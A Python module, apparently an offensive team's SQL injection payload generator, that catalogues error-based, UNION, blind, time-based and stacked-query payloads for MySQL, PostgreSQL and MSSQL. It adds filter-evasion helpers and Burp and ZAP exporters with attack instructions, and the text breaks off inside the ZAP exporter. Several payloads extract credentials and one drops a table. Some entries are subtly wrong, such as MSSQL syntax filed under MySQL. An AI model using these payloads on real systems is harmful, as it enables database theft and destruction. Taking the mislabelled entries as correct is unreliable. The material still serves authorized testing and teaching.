"""
SQL Injection Payload Module - Simulation Mode
Advanced SQLi payload generation for security testing and educational purposes.
NO LIVE DATABASE INTERACTION - Simulation & Educational Use Only
"""

from enum import Enum
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
import string
import random
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DatabaseType(Enum):
    """Supported database types for payload generation"""
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "MSSQL"
    ORACLE = "Oracle"
    SQLITE = "SQLite"


class SQLiPayloadType(Enum):
    """Types of SQL injection attacks"""
    ERROR_BASED = "error_based"
    UNION_BASED = "union_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BASED = "time_based"
    STACKED_QUERIES = "stacked_queries"
    COMMENT_BYPASS = "comment_bypass"


@dataclass
class SQLiPayload:
    """Data class for SQL injection payload"""
    payload: str
    payload_type: SQLiPayloadType
    db_type: DatabaseType
    description: str
    exploitation_method: str
    detection_difficulty: str  # Easy, Medium, Hard
    timestamp: Optional[datetime] = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
    
    def __str__(self):
        return f"""
        ╔═══════════════════════════════════════════════════════════╗
        ║ SQL Injection Payload                                      ║
        ╠═══════════════════════════════════════════════════════════╣
        ║ Type: {self.payload_type.value}
        ║ Database: {self.db_type.value}
        ║ Difficulty: {self.detection_difficulty}
        ╠═══════════════════════════════════════════════════════════╣
        ║ PAYLOAD:
        ║ {self.payload}
        ╠═══════════════════════════════════════════════════════════╣
        ║ Description:
        ║ {self.description}
        ╠═══════════════════════════════════════════════════════════╣
        ║ Exploitation Method:
        ║ {self.exploitation_method}
        ╚═══════════════════════════════════════════════════════════╝
        """


class ErrorBasedPayloads:
    """Generate error-based SQL injection payloads"""
    
    @staticmethod
    def mysql_error_payloads() -> List[SQLiPayload]:
        """MySQL error-based payloads"""
        payloads = []
        
        # Syntax error exploitation
        payloads.append(SQLiPayload(
            payload="1' AND 1=CONVERT(int, (SELECT @@version))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract MySQL version through CONVERT function error",
            exploitation_method="Triggers CONVERT error, returns database version in error message",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND extractvalue(rand(), concat(0x3a, (SELECT user())))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract current database user using extractvalue() function",
            exploitation_method="extractvalue() function error displays current_user() result",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND updatexml(1, concat(0x3a, (SELECT database())), 1)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract database name using updatexml() function",
            exploitation_method="updatexml() throws error containing database name",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract table names from information_schema",
            exploitation_method="Duplicate key error displays table names",
            detection_difficulty="Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND ST_LatFromGeoHash((SELECT CONCAT(user, ':', password) FROM users LIMIT 1))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract user credentials using GeoHash function error",
            exploitation_method="ST_LatFromGeoHash error returns data in error message",
            detection_difficulty="Hard"
        ))
        
        return payloads
    
    @staticmethod
    def postgresql_error_payloads() -> List[SQLiPayload]:
        """PostgreSQL error-based payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' AND CAST((SELECT version()) AS int)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract PostgreSQL version through CAST error",
            exploitation_method="CAST to int triggers error containing version string",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT ((SELECT version())::int))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract version using double cast syntax",
            exploitation_method="Type casting error exposes version information",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND CAST(CONCAT((SELECT current_user), (SELECT version())) AS int)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract current user and version combined",
            exploitation_method="CAST error displays concatenated sensitive data",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT (SELECT array_agg(tablename) FROM pg_tables WHERE schemaname='public')::int)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract all table names from public schema",
            exploitation_method="Array aggregation error displays all table names",
            detection_difficulty="Hard"
        ))
        
        return payloads
    
    @staticmethod
    def mssql_error_payloads() -> List[SQLiPayload]:
        """MSSQL error-based payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' AND CONVERT(int, @@version)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract MSSQL version through CONVERT error",
            exploitation_method="CONVERT to int error displays version string",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND CONVERT(int, (SELECT @@servername))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract server name via CONVERT",
            exploitation_method="Type conversion error returns server name",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND CONVERT(int, (SELECT DB_NAME()))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract database name",
            exploitation_method="CONVERT error displays current database",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND CONVERT(int, (SELECT SUSER_NAME()))--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract current login user",
            exploitation_method="CONVERT error shows SQL Server login",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND 1=(CASE WHEN @@version LIKE '%2019%' THEN 1 ELSE (SELECT @@version) END)--",
            payload_type=SQLiPayloadType.ERROR_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract version with conditional error",
            exploitation_method="Conditional CASE statement triggers error if version doesn't match",
            detection_difficulty="Hard"
        ))
        
        return payloads


class UnionBasedPayloads:
    """Generate UNION-based SQL injection payloads"""
    
    @staticmethod
    def mysql_union_payloads() -> List[SQLiPayload]:
        """MySQL UNION-based payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT NULL, user(), version(), database()--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract basic database information via UNION",
            exploitation_method="UNION query combines attacker query with legitimate query results",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns WHERE table_schema=database()--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract all tables and columns from current database",
            exploitation_method="UNION combines information_schema query with output",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT GROUP_CONCAT(table_name), GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database()--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract and concatenate all tables and columns",
            exploitation_method="GROUP_CONCAT aggregates multiple rows into single output",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT column_name, data_type, column_key, NULL FROM information_schema.columns WHERE table_name='users'--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract schema of 'users' table",
            exploitation_method="UNION displays column names, types, and key information",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT username, password, email, NULL FROM users WHERE 1=1--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MYSQL,
            description="Extract user credentials directly",
            exploitation_method="UNION retrieves username, password, email from users table",
            detection_difficulty="Easy"
        ))
        
        return payloads
    
    @staticmethod
    def postgresql_union_payloads() -> List[SQLiPayload]:
        """PostgreSQL UNION-based payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT version(), current_user, current_database(), NULL--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract basic PostgreSQL information",
            exploitation_method="UNION combines version/user/database functions",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT tablename, NULL, NULL, NULL FROM pg_tables WHERE schemaname='public'--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="List all tables in public schema",
            exploitation_method="UNION queries pg_tables system catalog",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT column_name, data_type, NULL, NULL FROM information_schema.columns WHERE table_name='users'--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Extract columns from users table",
            exploitation_method="UNION queries information_schema for column details",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT string_agg(tablename, ', '), string_agg(schemaname, ', '), NULL, NULL FROM pg_tables--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Aggregate all tables and schemas",
            exploitation_method="string_agg concatenates results",
            detection_difficulty="Hard"
        ))
        
        return payloads
    
    @staticmethod
    def mssql_union_payloads() -> List[SQLiPayload]:
        """MSSQL UNION-based payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT @@servername, @@version, DB_NAME(), NULL--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract server, version, and database information",
            exploitation_method="UNION combines system variables",
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT TABLE_NAME, COLUMN_NAME, DATA_TYPE, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo'--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract schema information from dbo tables",
            exploitation_method="UNION queries INFORMATION_SCHEMA",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT name, NULL, NULL, NULL FROM sysobjects WHERE xtype='U'--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MSSQL,
            description="Extract user-defined table names",
            exploitation_method="UNION queries sysobjects system table",
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT STRING_AGG(name, ', '), NULL, NULL, NULL FROM sys.tables--",
            payload_type=SQLiPayloadType.UNION_BASED,
            db_type=DatabaseType.MSSQL,
            description="Aggregate all table names",
            exploitation_method="STRING_AGG concatenates results",
            detection_difficulty="Hard"
        ))
        
        return payloads


class BlindSQLiPayloads:
    """Generate Blind SQL Injection payloads (Boolean and Time-based - Description Only)"""
    
    @staticmethod
    def boolean_blind_payloads() -> List[SQLiPayload]:
        """Boolean-based blind SQL injection payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            payload_type=SQLiPayloadType.BOOLEAN_BLIND,
            db_type=DatabaseType.MYSQL,
            description="Boolean blind: Verify database accessibility",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Send payload with AND condition
            2. If page content differs when condition is TRUE vs FALSE
            3. Attacker deduces database state without direct output
            4. Character-by-character database extraction possible
            
            Example progression:
            - 'AND 1=1' → TRUE condition (normal response)
            - 'AND 1=2' → FALSE condition (different response)
            - 'AND (SELECT SUBSTRING(database(),1,1)) > 'a'' → Binary search
            - Iterate: a-m < results in different response (e.g., 'm')
            - 'AND (SELECT SUBSTRING(database(),1,1)) > 'm'' → Continue narrowing
            
            This allows character-by-character extraction of sensitive data
            """,
            detection_difficulty="Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT LENGTH(user())) > 5--",
            payload_type=SQLiPayloadType.BOOLEAN_BLIND,
            db_type=DatabaseType.MYSQL,
            description="Boolean blind: Extract username length",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Use LENGTH() function to determine data size
            2. Binary search: 'LENGTH(user()) > 5' vs 'LENGTH(user()) > 10'
            3. Narrow down exact length through boolean responses
            4. Once length is known (e.g., 7 characters):
               - Extract character by character: SUBSTRING(user(), 1, 1)
               - Compare against ASCII ranges: SUBSTRING(user(), 1, 1) > 64
               - Continues until exact character identified
            
            Example: If username is 'admin22'
            - 'LENGTH(user()) = 7' returns TRUE
            - 'SUBSTRING(user(), 1, 1) > 'a'' returns TRUE
            - 'SUBSTRING(user(), 1, 1) > 'm'' returns FALSE
            - Character is between 'a' and 'm' → 'admin'
            """,
            detection_difficulty="Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0--",
            payload_type=SQLiPayloadType.BOOLEAN_BLIND,
            db_type=DatabaseType.POSTGRESQL,
            description="Boolean blind: Check username patterns",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Use LIKE operator with wildcard patterns
            2. Enumerate usernames: 'admin%', 'user%', 'test%'
            3. For known pattern 'admin%':
               - Narrow down: 'admin_' then 'admin__' etc.
            4. Combine with SUBSTRING for specific position extraction:
               - 'WHERE username LIKE 'admin%''
            5. Boolean response indicates pattern match
            
            This allows database enumeration without error messages
            """,
            detection_difficulty="Very Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 100 THEN 1 ELSE 0 END) = 1--",
            payload_type=SQLiPayloadType.BOOLEAN_BLIND,
            db_type=DatabaseType.MSSQL,
            description="Boolean blind: Table record counting",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Use CASE WHEN for conditional boolean results
            2. Count table records: 'COUNT(*) > 100'
            3. Binary search on count:
               - 'COUNT(*) > 50' → TRUE or FALSE
               - 'COUNT(*) > 75' → TRUE or FALSE
               - Narrow range until exact count found
            4. Useful for:
               - Determining database size
               - Verifying data existence
               - Estimating table importance
            """,
            detection_difficulty="Hard"
        ))
        
        return payloads
    
    @staticmethod
    def time_based_payloads() -> List[SQLiPayload]:
        """Time-based blind SQL injection payloads"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            payload_type=SQLiPayloadType.TIME_BASED,
            db_type=DatabaseType.MYSQL,
            description="Time-based blind: Sleep function delay",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Inject SLEEP() function for time-based detection
            2. Payload execution causes X-second delay
            3. Attacker measures response time:
               - Normal response: ~0.5s
               - With SLEEP(5): ~5.5s → Confirms injection
            
            Exploitation flow:
            - 'SLEEP(5) IF condition_true ELSE 0'
            - Condition TRUE → 5 second delay (confirms injection)
            - Condition FALSE → normal response time
            
            Character extraction:
            - 'SUBSTRING(user(),1,1)='a' SLEEP(5)'
            - If delay occurs → first character is 'a'
            - If no delay → try next character
            
            This bypasses output completely, uses timing as data channel
            """,
            detection_difficulty="Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND IF((SELECT COUNT(*) FROM users) > 10, SLEEP(5), 0)--",
            payload_type=SQLiPayloadType.TIME_BASED,
            db_type=DatabaseType.MYSQL,
            description="Time-based blind: Conditional sleep based on count",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. Use IF() for conditional timing:
               - IF(condition, SLEEP(5), 0)
            2. Condition evaluation determines delay
            
            Example: User enumeration
            - 'IF(COUNT(user) > 100, SLEEP(5), 0)'
            - 5 second delay → more than 100 users
            - No delay → 100 or fewer users
            
            Exact count finding (binary search):
            - 'IF(COUNT(*) > 50, SLEEP(5), 0)'
            - 'IF(COUNT(*) > 75, SLEEP(5), 0)'
            - 'IF(COUNT(*) > 87, SLEEP(5), 0)'
            - Continue until exact count identified
            """,
            detection_difficulty="Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' OR 1=1; WAITFOR DELAY '00:00:05'--",
            payload_type=SQLiPayloadType.TIME_BASED,
            db_type=DatabaseType.MSSQL,
            description="Time-based blind: MSSQL WAITFOR command",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. MSSQL uses WAITFOR command instead of SLEEP
            2. Syntax: WAITFOR DELAY 'hh:mm:ss'
            
            Exploitation:
            - 'WAITFOR DELAY '00:00:05'' → 5 second delay
            - Combined with stacked queries: '; WAITFOR...'
            - Requires semicolon for query separation
            
            Conditional timing:
            - 'IF (SELECT COUNT(*) FROM users) > 100'
            - 'WAITFOR DELAY '00:00:05''
            
            Data extraction:
            - Enumerate character by character
            - Use SUBSTRING and ASCII comparisons
            - Time delay indicates character match
            """,
            detection_difficulty="Very Hard"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND (SELECT CASE WHEN (SUBSTRING(user(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            payload_type=SQLiPayloadType.TIME_BASED,
            db_type=DatabaseType.POSTGRESQL,
            description="Time-based blind: PostgreSQL pg_sleep function",
            exploitation_method="""
            EXPLOITATION METHOD (Description Only):
            1. PostgreSQL uses pg_sleep(seconds) function
            2. Can be combined with CASE WHEN for conditionals
            
            Character extraction process:
            - 'SUBSTRING(user(),1,1)='a'' → if TRUE, 5 second delay
            - Try 'a' through 'z' until delay occurs
            - Found character → move to position 2
            - 'SUBSTRING(user(),2,1)='d'' → test next position
            
            Data extraction:
            - Similar to SLEEP-based, different function name
            - Allows full database enumeration
            - Very reliable but slow (5+ seconds per character)
            
            Optimization:
            - Use binary search on ASCII values
            - '(ASCII(SUBSTRING(user(),1,1))>96)' → faster
            """,
            detection_difficulty="Very Hard"
        ))
        
        return payloads


class CommentBypassPayloads:
    """Generate comment-based bypass payloads"""
    
    @staticmethod
    def comment_bypass_payloads() -> List[SQLiPayload]:
        """Comment-based SQL injection bypasses"""
        payloads = []
        
        payloads.append(SQLiPayload(
            payload="1' OR '1'='1",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.MYSQL,
            description="Basic quote bypass without comments",
            exploitation_method="""
            Original query: SELECT * FROM users WHERE id='$input'
            Injected: 1' OR '1'='1
            Result: SELECT * FROM users WHERE id='1' OR '1'='1'
            
            The OR condition is always TRUE, returns all users
            Doesn't require comment removal, quote mismatch handled naturally
            """,
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT NULL#",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.MYSQL,
            description="Hash comment (#) bypass in MySQL",
            exploitation_method="""
            MySQL Comment types:
            1. '--' (double dash with space): Ignores rest of line
            2. '#' (hash): Ignores rest of line (web URL compatible)
            3. '/*' ... '*/' (block comment): Multi-line comments
            
            Original: SELECT * FROM users WHERE id='$id'
            Injected: 1' UNION SELECT version(), user()--
            Result: SELECT * FROM users WHERE id='1' UNION SELECT version(), user()--'
            
            Everything after '--' is ignored, including closing quote
            Allows arbitrary query injection
            """,
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' UNION SELECT NULL,NULL/*",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.MYSQL,
            description="Block comment bypass (/*...*/)",
            exploitation_method="""
            Block comments: /* ... */ span multiple lines
            
            Original: SELECT id, name FROM users WHERE id='$input' LIMIT 5
            Injected: 1' UNION SELECT user(), version()/*
            Result: SELECT id, name FROM users WHERE id='1' UNION SELECT user(), version()/* LIMIT 5'
            
            Everything after /* is commented, closing */ not needed at line end
            Useful when:
            - Output must match column count
            - WHERE conditions exist after injection point
            - LIMIT clauses need bypassing
            """,
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1'; DROP TABLE users; --",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.MYSQL,
            description="Stacked query comment bypass",
            exploitation_method="""
            Stacked queries (;) allow multiple statements
            
            Original: SELECT * FROM users WHERE id='$input'
            Injected: 1'; DROP TABLE users;--
            Result: SELECT * FROM users WHERE id='1'; DROP TABLE users;--'
            
            Executed as:
            1. SELECT * FROM users WHERE id='1'
            2. DROP TABLE users
            3. (Third statement commented out)
            
            Requires:
            - Multiple query support (mysqli, PDO, ODBC)
            - Database permissions to execute DDL
            - --' comments out remaining original query
            """,
            detection_difficulty="Medium"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' AND '1'='1' --",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.POSTGRESQL,
            description="PostgreSQL double-dash comment bypass",
            exploitation_method="""
            PostgreSQL comment syntax:
            - '--' (double dash): Line comment (must have space after --)
            - '/*' ... '*/' : Block comment
            
            Original: SELECT * FROM users WHERE id='$id'
            Injected: 1' AND '1'='1' --
            Result: SELECT * FROM users WHERE id='1' AND '1'='1' --'
            
            Closing ' and rest of query become comment
            Condition is always TRUE, returns entire table
            """,
            detection_difficulty="Easy"
        ))
        
        payloads.append(SQLiPayload(
            payload="1' OR '1'='1' /*",
            payload_type=SQLiPayloadType.COMMENT_BYPASS,
            db_type=DatabaseType.MSSQL,
            description="MSSQL comment bypass",
            exploitation_method="""
            MSSQL comment syntax:
            - '--' (double dash): Line comment
            - '/* ... */' : Block comment
            
            Original: SELECT * FROM users WHERE id='$id'
            Injected: 1' OR '1'='1' /*
            Result: SELECT * FROM users WHERE id='1' OR '1'='1' /*'
            
            Block comment opened but not closed - everything after becomes comment
            Closing quote and rest of original query ignored
            """,
            detection_difficulty="Easy"
        ))
        
        return payloads


class CaseVariationBypass:
    """Case variation logic for WAF/IDS bypass"""
    
    @staticmethod
    def generate_case_variations(payload: str) -> List[str]:
        """Generate case variations of SQL keywords"""
        variations = []
        keywords = ['SELECT', 'UNION', 'WHERE', 'OR', 'AND', 'FROM', 'INSERT', 'UPDATE', 'DELETE']
        
        # Generate payload with various case combinations
        modified_payload = payload
        
        for _ in range(5):
            case_variation = ""
            for char in modified_payload:
                if char.isalpha():
                    # Random case for each character
                    case_variation += char.upper() if random.choice([True, False]) else char.lower()
                else:
                    case_variation += char
            variations.append(case_variation)
        
        return variations
    
    @staticmethod
    def generate_inline_comment_bypass(payload: str) -> str:
        """Insert inline comments within SQL keywords"""
        return payload.replace("UNION", "UN/**/ION").replace("SELECT", "SE/**/LECT")
    
    @staticmethod
    def generate_encoding_variations(payload: str) -> Dict[str, str]:
        """Generate different encoding variations"""
        variations = {
            'hex': '0x' + payload.encode().hex(),
            'char': f"CHAR({','.join(str(ord(c)) for c in payload)})",
            'concat': "+".join(f"'{c}'" for c in payload),
        }
        return variations
    
    @staticmethod
    def generate_whitespace_bypass(payload: str) -> str:
        """Insert alternative whitespace characters"""
        variations = [
            payload.replace(" ", "\t"),  # Tab
            payload.replace(" ", "\n"),  # Newline
            payload.replace(" ", "\r"),  # Carriage return
            payload.replace(" ", "/**/"), # Comment-based whitespace
            payload.replace(" ", "%20"), # URL encoded space
        ]
        return random.choice(variations)


class SQLiPayloadGenerator:
    """Main SQL Injection Payload Generator"""
    
    def __init__(self):
        self.error_based = ErrorBasedPayloads()
        self.union_based = UnionBasedPayloads()
        self.blind = BlindSQLiPayloads()
        self.comments = CommentBypassPayloads()
        self.case_bypass = CaseVariationBypass()
    
    def generate_payloads_by_database(self, db_type: DatabaseType) -> Dict[str, List[SQLiPayload]]:
        """Generate all payloads for specific database"""
        payloads = {}
        
        if db_type == DatabaseType.MYSQL:
            payloads['error_based'] = self.error_based.mysql_error_payloads()
            payloads['union_based'] = self.union_based.mysql_union_payloads()
        
        elif db_type == DatabaseType.POSTGRESQL:
            payloads['error_based'] = self.error_based.postgresql_error_payloads()
            payloads['union_based'] = self.union_based.postgresql_union_payloads()
        
        elif db_type == DatabaseType.MSSQL:
            payloads['error_based'] = self.error_based.mssql_error_payloads()
            payloads['union_based'] = self.union_based.mssql_union_payloads()
        
        payloads['boolean_blind'] = self.blind.boolean_blind_payloads()
        payloads['time_based'] = self.blind.time_based_payloads()
        payloads['comment_bypass'] = self.comments.comment_bypass_payloads()
        
        return payloads
    
    def generate_all_payloads(self) -> Dict[str, Dict]:
        """Generate payloads for all supported databases"""
        all_payloads = {}
        
        for db_type in DatabaseType:
            all_payloads[db_type.value] = self.generate_payloads_by_database(db_type)
        
        return all_payloads
    
    def get_payload_by_type(self, payload_type: SQLiPayloadType, db_type: DatabaseType) -> List[SQLiPayload]:
        """Get payloads by type and database"""
        payloads = self.generate_payloads_by_database(db_type)
        return payloads.get(payload_type.value, [])
    
    def display_payload(self, payload: SQLiPayload):
        """Display formatted payload"""
        print(payload)
    
    def export_payloads_json(self, db_type: DatabaseType, output_file: str):
        """Export payloads to JSON file"""
        import json
        payloads = self.generate_payloads_by_database(db_type)
        
        export_data = {}
        for payload_type, payload_list in payloads.items():
            export_data[payload_type] = [
                {
                    'payload': p.payload,
                    'type': p.payload_type.value,
                    'database': p.db_type.value,
                    'description': p.description,
                    'difficulty': p.detection_difficulty,
                    'exploitation_method': p.exploitation_method
                }
                for p in payload_list
            ]
        
        with open(output_file, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        logger.info(f"Payloads exported to {output_file}")

    def display_cli(self, payloads_dict: Dict, include_explanation: bool = False) -> int:
        """Display payloads to CLI in formatted output"""
        total = 0
        for ptype, plist in payloads_dict.items():
            if not plist:
                continue
            label = ptype.upper().replace('_', ' ')
            print("\n" + "=" * 80)
            print(f"{label + ' PAYLOADS':^80}")
            print("=" * 80 + "\n")
            for p in plist:
                total += 1
                print(f"[{total}] Type: {p.payload_type.value.upper()} | DB: {p.db_type.value.upper()} | Difficulty: {p.detection_difficulty}")
                print(f"Description : {p.description}")
                print(f"Payload     : {p.payload}")
                if include_explanation:
                    print(f"Method      : {p.exploitation_method}")
                print("-" * 80)
        return total

    def export_txt(self, payloads_dict: Dict, db_label: str, output_dir: str = "sqli_output"):
        """Export payloads to plain-text catalog"""
        import os
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"sqli_{db_label.lower()}_payloads.txt")
        with open(path, 'w') as f:
            f.write(f"# SQL Injection Payload Catalog — {db_label.upper()}\n")
            f.write(f"# Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("# Purpose   : Educational & authorized testing only\n\n")
            for ptype, plist in payloads_dict.items():
                f.write(f"\n## {ptype.upper().replace('_', ' ')}\n")
                for p in plist:
                    f.write(f"{p.payload}\n")
        print(f"  ✅ TXT exported  → {path}")

    def export_burp(self, payloads_dict: Dict, db_label: str, output_dir: str = "sqli_output"):
        """Export payloads in Burp Suite Intruder format"""
        import os
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"sqli_{db_label.lower()}_burp.txt")
        with open(path, 'w') as f:
            f.write("# " + "="*76 + "\n")
            f.write("# BURP SUITE INTRUDER PAYLOAD LIST\n")
            f.write("# Tool    : SQL Injection Payload Generator\n")
            f.write("# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD\n")
            f.write(f"# Created : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Target  : {db_label.upper()} database\n")
            f.write("# Usage   : Burp Suite > Intruder > Payloads > Load > (this file)\n")
            f.write("# WARNING : Use ONLY on authorized targets with written permission\n")
            f.write("# " + "="*76 + "\n\n")

            f.write("# HOW TO USE:\n")
            f.write("#   1. Open Burp Suite → Proxy → Intercept a request\n")
            f.write("#   2. Right-click → Send to Intruder\n")
            f.write("#   3. Intruder → Positions → mark your injection point (Add §)\n")
            f.write("#   4. Intruder → Payloads → Payload type: Simple list\n")
            f.write("#   5. Click Load → select this file\n")
            f.write("#   6. Click Start Attack (authorized lab / DVWA ONLY)\n\n")

            for ptype, plist in payloads_dict.items():
                if not plist:
                    continue
                f.write("# " + "="*76 + "\n")
                f.write(f"# {ptype.upper().replace('_', ' ')} — {db_label.upper()}\n")
                f.write("# " + "="*76 + "\n")
                for p in plist:
                    f.write(f"# [{p.detection_difficulty}] {p.description}\n")
                    f.write(f"{p.payload}\n")
                f.write("\n")
        print(f"  ✅ Burp exported → {path}")
        print("     Import: Burp > Intruder > Payloads > Load")

    def export_zap(self, payloads_dict: Dict, db_label: str, output_dir: str = "sqli_output"):
        """Export payloads in OWASP ZAP Fuzzer format"""
        import os
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"sqli_{db_label.lower()}_zap.txt")
        with open(path, 'w') as f:
            f.write("# " + "="*76 + "\n")
            f.write("# OWASP ZAP FUZZER PAYLOAD LIST\n")
            f.write("# Tool    : SQL Injection Payload Generator\n")
            f.write("# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD\n")
